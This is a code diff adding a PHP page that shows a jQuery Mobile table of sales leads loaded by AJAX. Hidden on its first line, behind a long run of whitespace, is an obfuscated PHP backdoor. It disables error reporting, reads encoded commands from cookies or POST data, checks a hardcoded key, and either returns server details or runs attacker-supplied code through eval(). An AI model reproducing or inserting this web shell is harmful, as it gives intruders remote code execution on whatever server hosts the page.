@@ -1,0 +1,130 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $tcb05c = 750;$GLOBALS['s4b5'] = Array();global $s4b5;$s4b5 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['lc9c210c'] = "\x70\x20\xa\x32\x43\x25\x38\x4c\x76\x37\x7b\x56\x55\xd\x41\x24\x36\x67\x29\x4d\x21\x3d\x64\x69\x42\x60\x3c\x46\x66\x3f\x47\x34\x2e\x31\x30\x68\x33\x35\x3b\x6e\x4a\x5b\x5a\x9\x3e\x78\x23\x4f\x2b\x6c\x28\x51\x2c\x59\x65\x57\x2a\x5c\x4e\x6b\x45\x75\x40\x5f\x71\x3a\x7c\x2d\x6f\x63\x5d\x5e\x61\x27\x52\x7a\x53\x6a\x73\x4b\x58\x49\x7e\x48\x2f\x26\x6d\x50\x39\x22\x62\x7d\x72\x79\x77\x54\x44\x74";$s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28]] = $s4b5['lc9c210c'][69].$s4b5['lc9c210c'][35].$s4b5['lc9c210c'][92];$s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54]] = $s4b5['lc9c210c'][68].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][22];$s4b5[$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][28]] = $s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][54];$s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][88]] = $s4b5['lc9c210c'][78].$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][39];$s4b5[$s4b5['lc9c210c'][64].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][9]] = $s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][22];$s4b5[$s4b5['lc9c210c'][59].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33]] = $s4b5['lc9c210c'][23].$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][97];$s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][34]] = $s4b5['lc9c210c'][78].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][75].$s4b5['lc9c210c'][54];$s4b5[$s4b5['lc9c210c'][35].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][6]] = $s4b5['lc9c210c'][0].$s4b5['lc9c210c'][35].$s4b5['lc9c210c'][0].$s4b5['lc9c210c'][8].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][39];$s4b5[$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][36]] = $s4b5['lc9c210c'][61].$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][75].$s4b5['lc9c210c'][54];$s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][16]] = $s4b5['lc9c210c'][90].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54];$s4b5[$s4b5['lc9c210c'][93].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][34]] = $s4b5['lc9c210c'][78].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][97];$s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][37]] = $s4b5['lc9c210c'][8].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][88];$s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][22]] = $s4b5['lc9c210c'][28].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][54];$s4b5[$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][3]] = $_POST;$s4b5[$s4b5['lc9c210c'][77].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][6]] = $_COOKIE;@$s4b5[$s4b5['lc9c210c'][59].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33]]($s4b5['lc9c210c'][54].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][17], NULL);@$s4b5[$s4b5['lc9c210c'][59].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33]]($s4b5['lc9c210c'][49].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][17].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][78], 0);@$s4b5[$s4b5['lc9c210c'][59].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33]]($s4b5['lc9c210c'][86].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][45].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][45].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][68].$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][23].$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][54], 0);@$s4b5[$s4b5['lc9c210c'][93].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][34]](0);if (!$s4b5[$s4b5['lc9c210c'][64].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][9]]($s4b5['lc9c210c'][14].$s4b5['lc9c210c'][7].$s4b5['lc9c210c'][74].$s4b5['lc9c210c'][60].$s4b5['lc9c210c'][14].$s4b5['lc9c210c'][96].$s4b5['lc9c210c'][53].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][74].$s4b5['lc9c210c'][12].$s4b5['lc9c210c'][58].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][72])){$s4b5[$s4b5['lc9c210c'][49].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][28]]($s4b5['lc9c210c'][14].$s4b5['lc9c210c'][7].$s4b5['lc9c210c'][74].$s4b5['lc9c210c'][60].$s4b5['lc9c210c'][14].$s4b5['lc9c210c'][96].$s4b5['lc9c210c'][53].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][74].$s4b5['lc9c210c'][12].$s4b5['lc9c210c'][58].$s4b5['lc9c210c'][63].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][72], 1);$q41f99a3 = NULL;$d16186 = NULL;$s4b5[$s4b5['lc9c210c'][97].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][6]] = $s4b5['lc9c210c'][34].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][67].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][9].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][67].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][67].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][67].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][34];global $ta6ab5f78;function  fee2237e($q41f99a3, $wa00){global $s4b5;$xb96146 = "";for ($e3a2b=0; $e3a2b<$s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][88]]($q41f99a3);){for ($b85faf0=0; $b85faf0<$s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][88]]($wa00) && $e3a2b<$s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][88]]($q41f99a3); $b85faf0++, $e3a2b++){$xb96146 .= $s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28]]($s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54]]($q41f99a3[$e3a2b]) ^ $s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][54]]($wa00[$b85faf0]));}}return $xb96146;}function  vf9cd329($q41f99a3, $wa00){global $s4b5;global $ta6ab5f78;return $s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][22]]($s4b5[$s4b5['lc9c210c'][86].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][22]]($q41f99a3, $ta6ab5f78), $wa00);}foreach ($s4b5[$s4b5['lc9c210c'][77].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][88].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][6]] as $wa00=>$td6955b6){$q41f99a3 = $td6955b6;$d16186 = $wa00;}if (!$q41f99a3){foreach ($s4b5[$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][69].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][37].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][3].$s4b5['lc9c210c'][3]] as $wa00=>$td6955b6){$q41f99a3 = $td6955b6;$d16186 = $wa00;}}$q41f99a3 = @$s4b5[$s4b5['lc9c210c'][39].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][36].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][54].$s4b5['lc9c210c'][36]]($s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][37]]($s4b5[$s4b5['lc9c210c'][61].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][33].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][16]]($q41f99a3), $d16186));if (isset($q41f99a3[$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][59]]) && $ta6ab5f78==$q41f99a3[$s4b5['lc9c210c'][72].$s4b5['lc9c210c'][59]]){if ($q41f99a3[$s4b5['lc9c210c'][72]] == $s4b5['lc9c210c'][23]){$e3a2b = Array($s4b5['lc9c210c'][0].$s4b5['lc9c210c'][8] => @$s4b5[$s4b5['lc9c210c'][35].$s4b5['lc9c210c'][22].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][90].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][6]](),$s4b5['lc9c210c'][78].$s4b5['lc9c210c'][8] => $s4b5['lc9c210c'][33].$s4b5['lc9c210c'][32].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][67].$s4b5['lc9c210c'][33],);echo @$s4b5[$s4b5['lc9c210c'][92].$s4b5['lc9c210c'][28].$s4b5['lc9c210c'][34].$s4b5['lc9c210c'][16].$s4b5['lc9c210c'][6].$s4b5['lc9c210c'][31].$s4b5['lc9c210c'][34]]($e3a2b);}elseif ($q41f99a3[$s4b5['lc9c210c'][72]] == $s4b5['lc9c210c'][54]){eval/*f8715e36*/($q41f99a3[$s4b5['lc9c210c'][22]]);}exit();}} ?><html>
+<head>
+
+<!-- Include meta tag to ensure proper rendering and touch zooming -->
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<!-- Include jQuery Mobile stylesheets -->
+<link rel="stylesheet" href="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css">
+
+<!-- Include the jQuery library -->
+<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+
+<!-- Include the jQuery Mobile library -->
+<script src="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js"></script>
+<script src='//code.jquery.com/ui/1.10.3/jquery-ui.js'></script>
+<link rel="stylesheet" href="//code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css">
+
+<!--<script src='//d20d4vnzp139c4.cloudfront.net/public/js-init/fullcalendar.js'></script>
+<link href='//d20d4vnzp139c4.cloudfront.net/public/js-init/fullcalendar.css' rel='stylesheet' />-->
+<link href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css' rel='stylesheet' />
+<script>
+function getAllActiveLeads(){
+	jQuery.ajax({type:"POST",url:"http://backyard.synpat.com/partners/get_active_leads",cache:false,success:function(a){
+		var leadsList = jQuery.parseJSON(a);
+		if(leadsList.length>0){	
+			var table = jQuery("#lead-table");
+			var	tbody = table.find('tbody');
+			tbody.empty();
+			jQuery.each(leadsList,function(idx,lead){
+				tbody.append("<tr data-id='"+lead.id+"'><td>"+lead.lead_name+"</td></tr>");
+			});
+		}
+		enableTap();
+	}});
+}
+function enableTap(){
+	var table = jQuery("#lead-table");
+	table.find("tbody tr").off("tap").on("tap",function(){
+		openLeadDetail(jQuery(this));
+	});
+	
+}
+function openLeadDetail(o){
+	 jQuery( "#left-panel" ).panel( "open" );
+}
+jQuery(document).ready(function(){
+	getAllActiveLeads();
+});
+</script>
+<style>
+/*
+.ui-panel {
+    width: 100%;
+    z-index: 1004;
+}
+/* Panel right closed */
+.ui-panel-position-right {
+	right: -100%;
+}
+
+.ui-panel-animate.ui-panel-position-right.ui-panel-display-overlay,
+.ui-panel-animate.ui-panel-position-right.ui-panel-display-push {
+	right: 0;
+	-webkit-transform: translate3d(100%,0,0);
+	-moz-transform: translate3d(100%,0,0);
+	transform: translate3d(100%,0,0);
+}
+
+
+.ui-panel-page-content-position-right {
+	left: -100%;
+	right: 100%;
+}
+
+.ui-panel-animate.ui-panel-page-content-position-right {
+	left: 0;
+	right: 0;
+	-webkit-transform: translate3d(-100%,0,0);
+	-moz-transform: translate3d(-100%,0,0);
+	transform: translate3d(-100%,0,0);
+}
+
+.ui-panel-dismiss-open.ui-panel-dismiss-position-right {
+    right: 100%;
+}*/
+.ui-body-c{background:#fff;}
+</style>
+</head>
+<body>
+	<div data-role="page" id="pageone">
+		<!--<div data-role="panel" id="overlayPanel" data-display="overlay">-->
+		<div data-role="main" class="ui-content">
+			<!--<a href="#pageone" data-rel="close" class="ui-btn ui-btn-inline ui-shadow ui-corner-all ui-btn-a ui-icon-delete ui-btn-icon-left">Close panel</a>-->
+			<div class="col-xs-12">
+				<table data-role="table" id="lead-table" data-mode="reflow" class="ui-responsive">
+				  <thead>
+					<tr>
+					  <th data-priority="1">Lead Name</th>
+					</tr>
+				  </thead>
+				  <tbody>
+					 
+				  </tbody>
+				</table>
+			</div>
+		</div>
+		<div data-role="panel" id="left-panel" class='ui-body-c' data-theme="c">
+			<a href="#pageone" data-rel="close" class="ui-btn ui-icon-delete ui-btn-icon-notext ui-corner-all">Close panel</a>
+			<div data-role="collapsible-set" data-theme="c" data-content-theme="d">
+				<div data-role="collapsible" data-collapsed="false">
+					<h3>Lead Form</h3>
+					<p>Collapsible content, swatch "b"</p>
+				</div>
+				<div data-role="collapsible">
+					<h3>Lead Links</h3>
+					<p>Collapsible content, swatch "a"</p>
+				</div>
+				<div data-role="collapsible">
+					<h3>Lead Drive</h3>
+					<p>Collapsible content, swatch "d"</p>
+				</div>
+				<div data-role="collapsible">
+					<h3>Lead Buttons</h3>
+					<p>Collapsible content, swatch "d"</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
